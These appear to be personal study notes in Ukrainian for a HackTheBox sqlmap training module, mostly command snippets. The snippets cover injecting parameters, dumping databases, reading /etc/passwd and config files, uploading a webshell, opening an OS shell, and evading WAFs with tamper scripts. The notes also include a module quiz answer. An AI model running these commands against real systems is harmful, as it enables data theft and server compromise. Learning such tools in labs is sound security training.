# SQLMap Essentials — Теорія та команди

## Модуль
[SQLMap Essentials](https://academy.hackthebox.com/app/module/58)

---

## Типи SQLi (по швидкості)

| Тип | Швидкість | Опис |
|-----|-----------|------|
| **UNION-based** | ⚡ Найшвидший | Дані повертаються прямо у відповіді |
| **Error-based** | ⚡ Швидкий | Дані витягуються через SQL помилки |
| **Boolean-based Blind** | 🐢 Повільний | Один біт за раз через true/false |
| **Time-based Blind** | 🐢🐢 Найповільніший | Через затримку SLEEP() |
| **Stacked Queries** | Varies | Кілька запитів через `;` |

**Відповідь на Q:** `UNION query-based`

---

## Базовий запуск sqlmap

```bash
# GET параметр
sqlmap -u "http://TARGET/page.php?id=1"

# POST параметр
sqlmap -u "http://TARGET/login.php" \
  --data="username=admin&password=test"

# З cookie
sqlmap -u "http://TARGET/page.php?id=1" \
  --cookie="PHPSESSID=abc123"

# З заголовком
sqlmap -u "http://TARGET/" \
  --header="Authorization: Bearer TOKEN"

# HTTPS (ignore SSL)
sqlmap -u "https://TARGET/page.php?id=1" \
  --batch
```

---

## Вказати injection точку вручну

```bash
# Маркер * в GET
sqlmap -u "http://TARGET/page.php?id=1*"

# Маркер * в POST
sqlmap -u "http://TARGET/api/login.php" \
  --data='{"username":"admin*","password":"test"}' \
  --header="Content-Type: application/json"

# З файлу (Burp request)
sqlmap -r request.txt
# request.txt — збережений HTTP запит з Burp (з * на injection точці)
```

---

## Рівень агресивності

```bash
--level=1   # базовий (default)
--level=5   # максимум — тестує headers, cookies, referer
--risk=1    # безпечний (default)
--risk=3    # агресивний — OR-based payloads (може змінити дані!)
```

---

## Техніки

```bash
--technique=B   # Boolean-based blind
--technique=T   # Time-based blind
--technique=U   # UNION-based
--technique=E   # Error-based
--technique=S   # Stacked queries
--technique=Q   # Inline queries
# Комбінація:
--technique=BT  # Boolean + Time
```

---

## Enumeration

```bash
# Список баз даних
--dbs

# Поточна БД
--current-db

# Поточний юзер
--current-user

# Таблиці в БД
-D dbname --tables

# Колонки в таблиці
-D dbname -T tablename --columns

# Дамп таблиці
-D dbname -T tablename --dump

# Дамп конкретних колонок
-D dbname -T tablename -C col1,col2 --dump

# Дамп з фільтром
-D dbname -T tablename --dump --where="username='admin'"

# Всі таблиці всіх БД
--dump-all

# Тільки не-системні БД
--dump-all --exclude-sysdbs
```

---

## File Read / Write

```bash
# Читання файлу
--file-read=/etc/passwd
--file-read=/etc/nginx/sites-enabled/default
--file-read=/var/www/html/config.php

# Запис файлу
--file-write=./shell.php --file-dest=/var/www/html/shell.php
```

---

## OS Shell / SQL Shell

```bash
# Інтерактивний OS shell (через webshell)
--os-shell
# → вибрати мову (PHP/ASP/JSP)
# → вказати web root директорію

# SQL shell
--sql-shell

# Виконати одну SQL команду
--sql-query="SELECT user()"
```

---

## Продуктивність та OPSEC

```bash
--threads=10        # паралельних потоків (max 10)
--batch             # не питати підтвердження (автоматичний режим)
--random-agent      # рандомний User-Agent
--proxy=http://127.0.0.1:8080   # через Burp
--delay=1           # затримка між запитами (сек)
--timeout=10        # таймаут запиту

# Tamper scripts (обхід WAF/фільтрів)
--tamper=space2comment    # пробіли → /**/
--tamper=between          # AND/OR → BETWEEN
--tamper=randomcase       # RaNdOmCaSe
--tamper=base64encode     # base64 encoding
# Комбінація
--tamper=space2comment,randomcase
```

---

## Збереження та відновлення

```bash
# Результати зберігаються автоматично:
~/.local/share/sqlmap/output/TARGET/

# Продовжити перерваний скан
sqlmap -u "URL" --resume

# Очистити сесію
sqlmap -u "URL" --flush-session
```

---

## Швидкий чекліст
sqlmap -u "URL" --batch --dbs → знайти БД
-D dbname --tables → знайти таблиці
-D dbname -T users --columns → знайти колонки
-D dbname -T users --dump → дамп даних
--file-read=/etc/nginx/sites-enabled/default → web root
--os-shell → /var/www/html → RCE
